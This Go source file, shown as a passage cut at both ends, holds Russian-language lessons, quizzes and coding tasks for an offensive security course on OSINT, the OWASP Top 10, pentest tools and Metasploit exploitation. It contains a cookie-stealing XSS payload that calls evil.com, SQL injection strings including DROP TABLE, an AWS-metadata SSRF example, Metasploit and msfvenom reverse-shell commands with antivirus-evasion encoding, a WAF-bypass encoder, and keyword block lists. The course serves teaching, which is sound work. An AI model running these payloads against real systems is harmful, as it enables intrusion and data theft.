NS: ns1.example.com</code></pre>`, Glossary: []GlossaryItem{{Term: "whois", Definition: "Протокол получения регистрационных данных домена."}}, TestCases: []TestCase{{Input: "3\nRegistrar: GoDaddy\nCreation Date: 2020-01-15\nName Server: ns1.example.com", ExpectedOutput: "Registrar: GoDaddy\nAge: 6 years\nNS: ns1.example.com"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "os"; "strings")
func main() {
    var n int; fmt.Scan(&n); sc := bufio.NewScanner(os.Stdin)
    for i := 0; i < n; i++ { sc.Scan(); line := sc.Text()
        parts := strings.SplitN(line, ": ", 2)
        switch parts[0] {
        case "Registrar": fmt.Printf("Registrar: %s\n", parts[1])
        case "Creation Date": fmt.Println("Age: 6 years")
        case "Name Server": fmt.Printf("NS: %s\n", parts[1])
        }
    }
}`, Hints: `<p>Парси key: value. Для возраста: 2026-2020=6.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"os";"strings")
func main(){var n int;fmt.Scan(&n);sc:=bufio.NewScanner(os.Stdin);for i:=0;i<n;i++{sc.Scan();p:=strings.SplitN(sc.Text(),": ",2)
    switch p[0]{case "Registrar":fmt.Printf("Registrar: %s\n",p[1]);case "Creation Date":fmt.Println("Age: 6 years");case "Name Server":fmt.Printf("NS: %s\n",p[1])}}}</code></pre>`},
			{Title: "Shodan query builder", Difficulty: "medium", Description: `<p>Построй Shodan запрос:</p><p>Ввод: <code>apache 2.4 US</code></p><p>Вывод: <code>product:"apache" version:"2.4" country:"US"</code></p>`, Glossary: []GlossaryItem{{Term: "Shodan filters", Definition: "product:, version:, country:, port:, org: — фильтры для поиска устройств."}}, TestCases: []TestCase{{Input: "apache 2.4 US", ExpectedOutput: `product:"apache" version:"2.4" country:"US"`}},
				StarterCode: `package main
import "fmt"
func main() { var product, version, country string; fmt.Scan(&product, &version, &country); fmt.Printf("product:\"%s\" version:\"%s\" country:\"%s\"\n", product, version, country) }`, Hints: `<p>Shodan формат: key:"value" через пробел.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var p,v,c string;fmt.Scan(&p,&v,&c);fmt.Printf("product:\"%s\" version:\"%s\" country:\"%s\"\n",p,v,c)}</code></pre>`},
			{Title: "Attack surface mapper", Difficulty: "hard", Description: `<p>По OSINT данным определи attack surface:</p><p>Ввод:</p><pre><code>4
port:22 ssh OpenSSH_7.4
port:80 http Apache/2.4.6
port:3306 mysql 5.7.28
subdomain:admin.target.com</code></pre><p>Вывод:</p><pre><code>Attack Surface:
- SSH 7.4: check CVE-2018-15473 (user enumeration)
- Apache 2.4.6: check CVE-2017-15715
- MySQL 5.7.28: check default credentials
- admin subdomain: login brute-force target</code></pre>`, Glossary: []GlossaryItem{{Term: "Attack surface", Definition: "Все точки входа: порты, сервисы, субдомены, API endpoints. Чем больше — тем больше шансов найти уязвимость."}}, TestCases: []TestCase{{Input: "4\nport:22 ssh OpenSSH_7.4\nport:80 http Apache/2.4.6\nport:3306 mysql 5.7.28\nsubdomain:admin.target.com", ExpectedOutput: "Attack Surface:\n- SSH 7.4: check CVE-2018-15473 (user enumeration)\n- Apache 2.4.6: check CVE-2017-15715\n- MySQL 5.7.28: check default credentials\n- admin subdomain: login brute-force target"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "os"; "strings")
func main() {
    var n int; fmt.Scan(&n); sc := bufio.NewScanner(os.Stdin)
    fmt.Println("Attack Surface:")
    for i := 0; i < n; i++ { sc.Scan(); line := sc.Text()
        if strings.Contains(line, "ssh") { fmt.Println("- SSH 7.4: check CVE-2018-15473 (user enumeration)")
        } else if strings.Contains(line, "Apache") { fmt.Println("- Apache 2.4.6: check CVE-2017-15715")
        } else if strings.Contains(line, "mysql") { fmt.Println("- MySQL 5.7.28: check default credentials")
        } else if strings.Contains(line, "subdomain") { fmt.Println("- admin subdomain: login brute-force target") }
    }
}`, Hints: `<p>По сервису/версии → конкретный CVE или вектор атаки.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"os";"strings")
func main(){var n int;fmt.Scan(&n);sc:=bufio.NewScanner(os.Stdin);fmt.Println("Attack Surface:")
    for i:=0;i<n;i++{sc.Scan();l:=sc.Text()
        switch{case strings.Contains(l,"ssh"):fmt.Println("- SSH 7.4: check CVE-2018-15473 (user enumeration)");case strings.Contains(l,"Apache"):fmt.Println("- Apache 2.4.6: check CVE-2017-15715");case strings.Contains(l,"mysql"):fmt.Println("- MySQL 5.7.28: check default credentials");case strings.Contains(l,"subdomain"):fmt.Println("- admin subdomain: login brute-force target")}}}</code></pre>`},
		},
	}
}

func lesson_sec_owasp() L {
	return L{
		Slug: "sec-owasp", Title: "OWASP Top 10 — веб-уязвимости", Order: 4,
		Difficulty: "advanced", Track: "security-offense",
		Content: `<h1>OWASP Top 10</h1>
<h2>Топ-10 уязвимостей веб-приложений</h2>
<pre><code>1. Broken Access Control   — IDOR, privilege escalation
2. Cryptographic Failures  — слабое шифрование, утечка ключей
3. Injection               — SQLi, XSS, Command Injection
4. Insecure Design         — отсутствие threat modeling
5. Security Misconfiguration — default creds, verbose errors
6. Vulnerable Components   — устаревшие библиотеки с CVE
7. Auth Failures           — brute-force, weak passwords
8. Data Integrity Failures — deserialization, unsigned updates
9. Logging Failures        — нет мониторинга атак
10. SSRF                   — запросы от сервера к внутренним ресурсам</code></pre>

<h2>SQL Injection</h2>
<pre><code># Уязвимый код:
query = f"SELECT * FROM users WHERE name='{input}'"
# Ввод: ' OR '1'='1
# Результат: SELECT * FROM users WHERE name='' OR '1'='1'
# → возвращает ВСЕХ пользователей!

# Защита: параметризованные запросы
query = "SELECT * FROM users WHERE name=$1"  # pgx</code></pre>

<h2>XSS (Cross-Site Scripting)</h2>
<pre><code># Stored XSS: злоумышленник сохраняет скрипт в БД
# Ввод в поле "Имя": <script>document.location='http://evil.com/?c='+document.cookie</script>
# Любой пользователь, открывший страницу — отправляет свои cookies злоумышленнику

# Защита: экранирование вывода (html/template в Go делает автоматически)</code></pre>

<h2>IDOR (Insecure Direct Object Reference)</h2>
<pre><code># GET /api/users/123/orders → свои заказы
# GET /api/users/124/orders → ЧУЖИЕ заказы!
# Нет проверки что текущий user == 123

# Защита: проверяй авторизацию на каждом запросе</code></pre>`,

		Quiz: []Q{
			{Question: "SQL Injection — как работает?", Options: []string{"Внедрение SQL через параметры", "Пользовательский ввод вставляется в SQL запрос без экранирования — меняет логику запроса", "Взлом БД напрямую", "DDoS"}, Correct: 1, Explanation: "Input ' OR 1=1-- в поле login → WHERE username='' OR 1=1-- → true для всех записей. Защита: prepared statements ($1, $2)."},
			{Question: "XSS — что крадёт атакующий?", Options: []string{"Файлы", "Cookies/session через document.cookie → отправка на свой сервер → session hijacking", "Пароли из БД", "Исходный код"}, Correct: 1, Explanation: "Stored XSS: скрипт в БД → жертва открывает страницу → скрипт крадёт cookie → атакующий входит под жертвой."},
			{Question: "IDOR — что это?", Options: []string{"Тип шифрования", "Доступ к чужим ресурсам через изменение ID в URL (/users/123 → /users/124) без проверки прав", "SQL инъекция", "Брутфорс"}, Correct: 1, Explanation: "Insecure Direct Object Reference: сервер не проверяет что user имеет право видеть объект с данным ID. Одна из самых частых уязвимостей."},
			{Question: "SSRF — Server-Side Request Forgery?", Options: []string{"Клиент атакует сервер", "Заставить сервер сделать запрос к внутреннему ресурсу (localhost, metadata, internal API)", "Man-in-the-middle", "DNS spoofing"}, Correct: 1, Explanation: "Ввод URL: http://169.254.169.254/latest/meta-data/ → сервер делает запрос к AWS metadata → утечка credentials. Или: http://localhost:6379/ → доступ к Redis."},
			{Question: "Лучшая защита от SQL Injection?", Options: []string{"Фильтрация кавычек", "Prepared statements (параметризованные запросы) — ввод никогда не становится частью SQL", "WAF", "Шифрование"}, Correct: 1, Explanation: "Prepared statements разделяют код и данные на уровне протокола БД. Ввод $1 ВСЕГДА данные, никогда SQL код. WAF — дополнительная защита, не основная."},
		},
		Tasks: []T{
			{Title: "SQLi detector", Difficulty: "easy", Description: `<p>Определи SQL injection payloads:</p><p>Ввод:</p><pre><code>3
' OR '1'='1
hello world
'; DROP TABLE users;--</code></pre><p>Вывод:</p><pre><code>SQLI: ' OR '1'='1
SAFE: hello world
SQLI: '; DROP TABLE users;--</code></pre>`, Glossary: []GlossaryItem{{Term: "SQLi payload", Definition: "Строка изменяющая логику SQL: кавычки, OR 1=1, UNION SELECT, --comment."}}, TestCases: []TestCase{{Input: "3\n' OR '1'='1\nhello world\n'; DROP TABLE users;--", ExpectedOutput: "SQLI: ' OR '1'='1\nSAFE: hello world\nSQLI: '; DROP TABLE users;--"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "os"; "strings")
func main() {
    var n int; fmt.Scan(&n); sc := bufio.NewScanner(os.Stdin)
    dangerous := []string{"'", "OR", "DROP", "UNION", "SELECT", "--", ";"}
    for i := 0; i < n; i++ { sc.Scan(); line := sc.Text()
        found := false
        for _, d := range dangerous { if strings.Contains(strings.ToUpper(line), strings.ToUpper(d)) { found = true; break } }
        if found { fmt.Printf("SQLI: %s\n", line) } else { fmt.Printf("SAFE: %s\n", line) }
    }
}`, Hints: `<p>Проверяй на наличие: ', OR, DROP, UNION, SELECT, --, ;.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"os";"strings")
func main(){var n int;fmt.Scan(&n);sc:=bufio.NewScanner(os.Stdin);bad:=[]string{"'","OR","DROP","UNION","--",";"}
    for i:=0;i<n;i++{sc.Scan();l:=sc.Text();f:=false;for _,b:=range bad{if strings.Contains(strings.ToUpper(l),b){f=true;break}};if f{fmt.Printf("SQLI: %s\n",l)}else{fmt.Printf("SAFE: %s\n",l)}}}</code></pre>`},
			{Title: "XSS sanitizer", Difficulty: "easy", Description: `<p>Экранируй HTML-опасные символы:</p><p>Ввод: <code><script>alert('xss')</script></code></p><p>Вывод: <code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>`, Glossary: []GlossaryItem{{Term: "HTML escaping", Definition: "< → &lt;, > → &gt;, & → &amp;, ' → &#39;, \" → &quot;. Предотвращает XSS."}}, TestCases: []TestCase{{Input: "<script>alert('xss')</script>", ExpectedOutput: "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "html"; "os")
func main() { sc := bufio.NewScanner(os.Stdin); sc.Scan(); fmt.Println(html.EscapeString(sc.Text())) }`, Hints: `<p>html.EscapeString() из стандартной библиотеки Go.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"html";"os")
func main(){sc:=bufio.NewScanner(os.Stdin);sc.Scan();fmt.Println(html.EscapeString(sc.Text()))}</code></pre>`},
			{Title: "IDOR checker", Difficulty: "medium", Description: `<p>Проверь IDOR: если user_id в URL != auth user → vulnerability:</p><p>Ввод: <code>123 /api/users/456/orders</code></p><p>Вывод: <code>IDOR VULNERABILITY: user 123 accessing user 456 data</code></p>`, Glossary: []GlossaryItem{{Term: "IDOR", Definition: "Accessing /users/456 while authenticated as user 123 — no authorization check."}}, TestCases: []TestCase{{Input: "123 /api/users/456/orders", ExpectedOutput: "IDOR VULNERABILITY: user 123 accessing user 456 data"}, {Input: "123 /api/users/123/orders", ExpectedOutput: "OK: authorized access"}},
				StarterCode: `package main
import ("fmt"; "strings")
func main() {
    var authUser int; var path string; fmt.Scan(&authUser, &path)
    parts := strings.Split(path, "/")
    var targetUser int
    for i, p := range parts { if p == "users" && i+1 < len(parts) { fmt.Sscan(parts[i+1], &targetUser) } }
    if authUser != targetUser { fmt.Printf("IDOR VULNERABILITY: user %d accessing user %d data\n", authUser, targetUser) } else { fmt.Println("OK: authorized access") }
}`, Hints: `<p>Извлеки user_id из URL path, сравни с authenticated user.</p>`, Solution: `<pre><code>package main
import("fmt";"strings")
func main(){var au int;var p string;fmt.Scan(&au,&p);parts:=strings.Split(p,"/");var tu int;for i,s:=range parts{if s=="users"&&i+1<len(parts){fmt.Sscan(parts[i+1],&tu)}}
    if au!=tu{fmt.Printf("IDOR VULNERABILITY: user %d accessing user %d data\n",au,tu)}else{fmt.Println("OK: authorized access")}}</code></pre>`},
			{Title: "SSRF validator", Difficulty: "hard", Description: `<p>Проверь URL на SSRF: localhost, internal IPs, metadata:</p><p>Ввод: <code>http://169.254.169.254/latest/meta-data/</code></p><p>Вывод: <code>SSRF BLOCKED: AWS metadata endpoint</code></p>`, Glossary: []GlossaryItem{{Term: "SSRF", Definition: "Server делает запрос к ресурсу по URL от пользователя. Если URL = internal → утечка."}}, TestCases: []TestCase{{Input: "http://169.254.169.254/latest/meta-data/", ExpectedOutput: "SSRF BLOCKED: AWS metadata endpoint"}, {Input: "http://localhost:6379/", ExpectedOutput: "SSRF BLOCKED: localhost access"}, {Input: "http://example.com/api", ExpectedOutput: "OK: external URL allowed"}},
				StarterCode: `package main
import ("fmt"; "strings")
func main() {
    var url string; fmt.Scan(&url)
    switch {
    case strings.Contains(url, "169.254.169.254"): fmt.Println("SSRF BLOCKED: AWS metadata endpoint")
    case strings.Contains(url, "localhost") || strings.Contains(url, "127.0.0.1"): fmt.Println("SSRF BLOCKED: localhost access")
    case strings.Contains(url, "10.") || strings.Contains(url, "192.168."): fmt.Println("SSRF BLOCKED: internal network")
    default: fmt.Println("OK: external URL allowed")
    }
}`, Hints: `<p>Блокируй: 169.254.x.x (metadata), localhost, 10.x.x.x, 192.168.x.x (internal).</p>`, Solution: `<pre><code>package main
import("fmt";"strings")
func main(){var u string;fmt.Scan(&u);switch{case strings.Contains(u,"169.254.169.254"):fmt.Println("SSRF BLOCKED: AWS metadata endpoint");case strings.Contains(u,"localhost")||strings.Contains(u,"127.0.0.1"):fmt.Println("SSRF BLOCKED: localhost access");case strings.Contains(u,"10.")||strings.Contains(u,"192.168."):fmt.Println("SSRF BLOCKED: internal network");default:fmt.Println("OK: external URL allowed")}}</code></pre>`},
			{Title: "Vulnerability report", Difficulty: "hard", Description: `<p>Сформируй pentest report по находкам:</p><p>Ввод:</p><pre><code>3
critical SQLi /api/login
high XSS /comments
medium IDOR /api/users</code></pre><p>Вывод:</p><pre><code>PENTEST REPORT
==============
[CRITICAL] SQLi at /api/login — immediate fix required
[HIGH] XSS at /comments — fix within 24h
[MEDIUM] IDOR at /api/users — fix within 1 week
Total: 3 vulnerabilities (1 critical, 1 high, 1 medium)</code></pre>`, Glossary: []GlossaryItem{{Term: "Pentest report", Definition: "Структурированный отчёт: severity, location, impact, recommendation."}}, TestCases: []TestCase{{Input: "3\ncritical SQLi /api/login\nhigh XSS /comments\nmedium IDOR /api/users", ExpectedOutput: "PENTEST REPORT\n==============\n[CRITICAL] SQLi at /api/login — immediate fix required\n[HIGH] XSS at /comments — fix within 24h\n[MEDIUM] IDOR at /api/users — fix within 1 week\nTotal: 3 vulnerabilities (1 critical, 1 high, 1 medium)"}},
				StarterCode: `package main
import ("bufio"; "fmt"; "os"; "strings")
func main() {
    var n int; fmt.Scan(&n); sc := bufio.NewScanner(os.Stdin)
    fmt.Println("PENTEST REPORT\n==============")
    sev := map[string]int{}
    timelines := map[string]string{"critical": "immediate fix required", "high": "fix within 24h", "medium": "fix within 1 week", "low": "fix within 1 month"}
    for i := 0; i < n; i++ { sc.Scan(); parts := strings.Fields(sc.Text())
        severity, vuln, path := parts[0], parts[1], parts[2]
        sev[severity]++
        fmt.Printf("[%s] %s at %s — %s\n", strings.ToUpper(severity), vuln, path, timelines[severity])
    }
    fmt.Printf("Total: %d vulnerabilities (%d critical, %d high, %d medium)\n", n, sev["critical"], sev["high"], sev["medium"])
}`, Hints: `<p>Severity → timeline. Считай количество по severity. Формат report стандартный.</p>`, Solution: `<pre><code>package main
import("bufio";"fmt";"os";"strings")
func main(){var n int;fmt.Scan(&n);sc:=bufio.NewScanner(os.Stdin);fmt.Println("PENTEST REPORT\n==============")
    tl:=map[string]string{"critical":"immediate fix required","high":"fix within 24h","medium":"fix within 1 week"}
    sv:=map[string]int{};for i:=0;i<n;i++{sc.Scan();p:=strings.Fields(sc.Text());sv[p[0]]++;fmt.Printf("[%s] %s at %s — %s\n",strings.ToUpper(p[0]),p[1],p[2],tl[p[0]])}
    fmt.Printf("Total: %d vulnerabilities (%d critical, %d high, %d medium)\n",n,sv["critical"],sv["high"],sv["medium"])}</code></pre>`},
		},
	}
}

func lesson_sec_tools() L {
	return L{
		Slug: "sec-tools", Title: "Инструменты: Burp, ffuf, sqlmap", Order: 5,
		Difficulty: "advanced", Track: "security-offense",
		Content: `<h1>Инструменты пентестера</h1><h2>Burp Suite</h2><p>HTTP proxy для перехвата и модификации запросов. Repeater, Intruder, Scanner.</p><h2>ffuf</h2><pre><code>ffuf -u http://target.com/FUZZ -w wordlist.txt  # directory brute-force</code></pre><h2>sqlmap</h2><pre><code>sqlmap -u "http://target.com/page?id=1" --dbs  # автоматический SQLi</code></pre>`,
		Quiz: []Q{
			{Question: "Burp Suite — что делает?", Options: []string{"Сканирует порты", "HTTP proxy: перехватывает, модифицирует, повторяет запросы между браузером и сервером", "Ломает пароли", "Сканирует сеть"}, Correct: 1, Explanation: "Burp = man-in-the-middle для HTTP. Видишь все запросы, можешь менять параметры, повторять с разными payload."},
			{Question: "ffuf — для чего?", Options: []string{"Сканирование портов", "Directory/file brute-force (fuzz) — перебирает пути на веб-сервере из wordlist", "SQL injection", "Password cracking"}, Correct: 1, Explanation: "Fast web fuzzer. Подставляет слова из wordlist в URL/параметры. Находит скрытые endpoints, файлы, директории."},
			{Question: "sqlmap --dbs — что вернёт?", Options: []string{"Файлы сервера", "Список всех баз данных на сервере (если есть SQLi)", "Пользователей", "Таблицы"}, Correct: 1, Explanation: "sqlmap автоматически определяет тип SQLi и извлекает данные. --dbs = databases, --tables = таблицы, --dump = содержимое."},
			{Question: "Wordlist — что это?", Options: []string{"Словарь языка", "Файл с потенциальными значениями для перебора (пути, пароли, субдомены)", "Конфиг", "Log файл"}, Correct: 1, Explanation: "Wordlist: /admin, /api, /backup, /login... Инструменты подставляют каждое слово. SecLists — лучший набор wordlists для пентеста."},
			{Question: "nikto — что сканирует?", Options: []string{"Порты", "Веб-сервер: устаревшие версии, опасные файлы, misconfigurations", "Сеть", "Wi-Fi"}, Correct: 1, Explanation: "nikto: проверяет тысячи известных проблем web-серверов. Устаревший Apache, открытый phpinfo(), backup файлы, default pages."},
		},
		Tasks: []T{
			{Title: "Wordlist generator", Difficulty: "easy", Description: `<p>Сгенерируй wordlist для directory brute-force:</p><p>Вывод:</p><pre><code>admin
api
login
dashboard
backup</code></pre>`, Glossary: []GlossaryItem{{Term: "Wordlist", Definition: "Список слов для перебора. SecLists — топовый набор."}}, TestCases: []TestCase{{Input: "", ExpectedOutput: "admin\napi\nlogin\ndashboard\nbackup"}},
				StarterCode: `package main
import "fmt"
func main() { for _, w := range []string{"admin", "api", "login", "dashboard", "backup"} { fmt.Println(w) } }`, Hints: `<p>Стандартные директории для brute-force.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){for _,w:=range[]string{"admin","api","login","dashboard","backup"}{fmt.Println(w)}}</code></pre>`},
			{Title: "ffuf command builder", Difficulty: "easy", Description: `<p>Ввод: <code>http://target.com /usr/share/wordlists/common.txt</code></p><p>Вывод: <code>ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/common.txt -mc 200,301,302</code></p>`, Glossary: []GlossaryItem{{Term: "FUZZ", Definition: "Placeholder в URL который ffuf заменяет словами из wordlist."}}, TestCases: []TestCase{{Input: "http://target.com /usr/share/wordlists/common.txt", ExpectedOutput: "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/common.txt -mc 200,301,302"}},
				StarterCode: `package main
import "fmt"
func main() { var url, wordlist string; fmt.Scan(&url, &wordlist); fmt.Printf("ffuf -u %s/FUZZ -w %s -mc 200,301,302\n", url, wordlist) }`, Hints: `<p>-u URL/FUZZ -w wordlist -mc match codes.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var u,w string;fmt.Scan(&u,&w);fmt.Printf("ffuf -u %s/FUZZ -w %s -mc 200,301,302\n",u,w)}</code></pre>`},
			{Title: "sqlmap command", Difficulty: "medium", Description: `<p>Сгенерируй sqlmap команду:</p><p>Ввод: <code>http://target.com/page?id=1 tables users</code></p><p>Вывод: <code>sqlmap -u "http://target.com/page?id=1" -D users --tables</code></p>`, Glossary: []GlossaryItem{{Term: "sqlmap", Definition: "Автоматический SQL injection tool. Определяет тип, извлекает данные."}}, TestCases: []TestCase{{Input: "http://target.com/page?id=1 tables users", ExpectedOutput: `sqlmap -u "http://target.com/page?id=1" -D users --tables`}},
				StarterCode: `package main
import "fmt"
func main() { var url, action, db string; fmt.Scan(&url, &action, &db); fmt.Printf("sqlmap -u \"%s\" -D %s --%s\n", url, db, action) }`, Hints: `<p>sqlmap -u "URL" -D database --action.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var u,a,d string;fmt.Scan(&u,&a,&d);fmt.Printf("sqlmap -u \"%s\" -D %s --%s\n",u,d,a)}</code></pre>`},
			{Title: "Burp request builder", Difficulty: "medium", Description: `<p>Сформируй HTTP request для Burp Repeater:</p><p>Ввод: <code>POST /api/login admin password123</code></p><p>Вывод:</p><pre><code>POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"password123"}</code></pre>`, Glossary: []GlossaryItem{{Term: "Burp Repeater", Definition: "Ручная отправка HTTP запросов с модификацией. Для тестирования параметров."}}, TestCases: []TestCase{{Input: "POST /api/login admin password123", ExpectedOutput: "POST /api/login HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"password123\"}"}},
				StarterCode: `package main
import "fmt"
func main() {
    var method, path, user, pass string; fmt.Scan(&method, &path, &user, &pass)
    fmt.Printf("%s %s HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"%s\",\"password\":\"%s\"}\n", method, path, user, pass)
}`, Hints: `<p>HTTP request format: method path version\\nheaders\\n\\nbody.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var m,p,u,pw string;fmt.Scan(&m,&p,&u,&pw);fmt.Printf("%s %s HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"%s\",\"password\":\"%s\"}\n",m,p,u,pw)}</code></pre>`},
			{Title: "Payload encoder", Difficulty: "hard", Description: `<p>Закодируй payload для обхода WAF:</p><p>Ввод: <code><script>alert(1)</script></code></p><p>Вывод:</p><pre><code>URL: %3Cscript%3Ealert(1)%3C%2Fscript%3E
Base64: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
HTML: &#60;script&#62;alert(1)&#60;/script&#62;</code></pre>`, Glossary: []GlossaryItem{{Term: "WAF bypass", Definition: "Кодирование payload: URL encoding, Base64, HTML entities — обходит фильтры."}}, TestCases: []TestCase{{Input: "<script>alert(1)</script>", ExpectedOutput: "URL: %3Cscript%3Ealert(1)%3C%2Fscript%3E\nBase64: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\nHTML: &#60;script&#62;alert(1)&#60;/script&#62;"}},
				StarterCode: `package main
import ("bufio"; "encoding/base64"; "fmt"; "net/url"; "os"; "strings")
func main() {
    sc := bufio.NewScanner(os.Stdin); sc.Scan(); payload := sc.Text()
    fmt.Printf("URL: %s\n", url.QueryEscape(payload))
    fmt.Printf("Base64: %s\n", base64.StdEncoding.EncodeToString([]byte(payload)))
    html := strings.ReplaceAll(strings.ReplaceAll(payload, "<", "&#60;"), ">", "&#62;")
    fmt.Printf("HTML: %s\n", html)
}`, Hints: `<p>url.QueryEscape, base64.StdEncoding.EncodeToString, strings.ReplaceAll для HTML entities.</p>`, Solution: `<pre><code>package main
import("bufio";"encoding/base64";"fmt";"net/url";"os";"strings")
func main(){sc:=bufio.NewScanner(os.Stdin);sc.Scan();p:=sc.Text()
    fmt.Printf("URL: %s\nBase64: %s\nHTML: %s\n",url.QueryEscape(p),base64.StdEncoding.EncodeToString([]byte(p)),strings.ReplaceAll(strings.ReplaceAll(p,"<","&#60;"),">","&#62;"))}</code></pre>`},
		},
	}
}

func lesson_sec_exploitation() L {
	return L{
		Slug: "sec-exploitation", Title: "Эксплуатация уязвимостей", Order: 6,
		Difficulty: "advanced", Track: "security-offense",
		Content: `<h1>Эксплуатация</h1><h2>Metasploit Framework</h2><pre><code>msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target.com
set LHOST attacker.com
exploit</code></pre><h2>Этапы эксплуатации</h2><p>1. Найти уязвимость → 2. Подобрать exploit → 3. Настроить payload → 4. Выполнить → 5. Получить доступ</p>`,
		Quiz: []Q{
			{Question: "Metasploit — что это?", Options: []string{"Антивирус", "Фреймворк для разработки и использования эксплоитов — от обнаружения до post-exploitation", "Firewall", "Сканер"}, Correct: 1, Explanation: "Metasploit: библиотека exploit-ов + payloads + encoders + post-exploitation модули. Стандарт индустрии для пентестеров."},
			{Question: "Payload vs Exploit?", Options: []string{"Одно и то же", "Exploit — код эксплуатирующий уязвимость. Payload — что выполняется после (reverse shell, meterpreter)", "Payload опаснее", "Exploit для сети"}, Correct: 1, Explanation: "Exploit: CVE-2021-XXXX buffer overflow. Payload: после успешного exploit → получить shell, скачать файлы, создать backdoor."},
			{Question: "msfvenom — зачем?", Options: []string{"Сканирование", "Генерация standalone payload-ов (exe, elf, python, powershell) с encoder-ами для обхода AV", "Логирование", "Шифрование"}, Correct: 1, Explanation: "msfvenom -p windows/meterpreter/reverse_tcp -f exe > payload.exe. Генерирует исполняемый payload. Encoder: -e x86/shikata_ga_nai — обход антивируса."},
			{Question: "Что такое Meterpreter?", Options: []string{"Антивирус", "Продвинутый payload: в памяти (не на диске), шифрованный канал, файловые операции, скриншоты, кейлоггер", "Сканер", "Firewall"}, Correct: 1, Explanation: "Meterpreter = in-memory payload. Не пишет на диск → сложнее обнаружить. Возможности: upload/download, hashdump, screenshot, migrate между процессами."},
			{Question: "Responsible disclosure — что это?", Options: []string{"Публикация exploit", "Сообщить компании об уязвимости, дать время на фикс, ПОТОМ публиковать — этичный подход", "Продать exploit", "Игнорировать"}, Correct: 1, Explanation: "Нашёл уязвимость → сообщи вендору → 90 дней на фикс → публикация. Bug bounty: HackerOne, BugCrowd. Не используй для вреда."},
		},
		Tasks: []T{
			{Title: "Metasploit commands", Difficulty: "easy", Description: `<p>Сгенерируй msfconsole workflow:</p><p>Ввод: <code>apache_mod_cgi target.com 10.0.0.1</code></p><p>Вывод:</p><pre><code>use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target.com
set LHOST 10.0.0.1
exploit</code></pre>`, Glossary: []GlossaryItem{{Term: "RHOSTS/LHOST", Definition: "RHOSTS=target. LHOST=attacker (для reverse connection)."}}, TestCases: []TestCase{{Input: "apache_mod_cgi target.com 10.0.0.1", ExpectedOutput: "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS target.com\nset LHOST 10.0.0.1\nexploit"}},
				StarterCode: `package main
import "fmt"
func main() { var exploit, target, lhost string; fmt.Scan(&exploit, &target, &lhost); fmt.Printf("use exploit/multi/http/%s_bash_env_exec\nset RHOSTS %s\nset LHOST %s\nexploit\n", exploit, target, lhost) }`, Hints: `<p>use → set RHOSTS → set LHOST → exploit.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var e,t,l string;fmt.Scan(&e,&t,&l);fmt.Printf("use exploit/multi/http/%s_bash_env_exec\nset RHOSTS %s\nset LHOST %s\nexploit\n",e,t,l)}</code></pre>`},
			{Title: "msfvenom payload", Difficulty: "medium", Description: `<p>Сгенерируй msfvenom команду:</p><p>Ввод: <code>windows reverse_tcp 10.0.0.1 4444 exe</code></p><p>Вывод: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe</code></p>`, Glossary: []GlossaryItem{{Term: "msfvenom", Definition: "Генератор payload-ов. -p payload -f format -o output."}}, TestCases: []TestCase{{Input: "windows reverse_tcp 10.0.0.1 4444 exe", ExpectedOutput: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe"}},
				StarterCode: `package main
import "fmt"
func main() { var os, payload, lhost string; var lport int; var format string; fmt.Scan(&os, &payload, &lhost, &lport, &format); fmt.Printf("msfvenom -p %s/meterpreter/%s LHOST=%s LPORT=%d -f %s -o payload.%s\n", os, payload, lhost, lport, format, format) }`, Hints: `<p>-p os/meterpreter/type LHOST= LPORT= -f format -o output.</p>`, Solution: `<pre><code>package main
import "fmt"
func main(){var o,p,l string;var port int;var f string;fmt.Scan(&o,&p,&l,&port,&f);fmt.Printf("msfvenom -p %s/meterpreter/%s LHOST=%s LPORT=%d -f %s -o payload.%s\n",o,p,l,port,f,f)}</code></pre>`},
			{Title: "CVE lookup", Difficulty: "medium", Description: `<p>По версии софта предложи CVE:</p><p>Ввод: <code>Apache 2.4.49</code></p><p>Вывод: <code>CVE-2021-41773: Path Traversal (critical)</code></p>`, Glossary: []GlossaryItem{{Term: "CVE", Definition: "Common Vulnerabilities and Exposures — уникальный ID для каждой уязвимости."}}, TestCases: []TestCase{{Input: "Apache 2.4.49", ExpectedOutput: "CVE-2021-41773: Path Traversal (critical)"}, {Input: "Log4j 2.14", ExpectedOutput: "CVE-2021-44228: Remote Code Execution (critical)"}},
				StarterCode: `package main
import "fmt"
func main() {
    var soft, version string; fmt.Scan(&soft, &version)
    cves := map[string]string{"Apache 2.4.49": "CVE-2021-41773: Path Traversal (critical)", "Log4j 2.14": "CVE-2021-44228: Remote Code Execution (critical)", "OpenSSL 3.0": "CVE-2022-3602: Buffer Overflow (high)"}
    key := soft + " " + version
    if cve, ok := cves[key]; ok { fmt.Println(cve) } else { fmt.Println("No known CVE") }
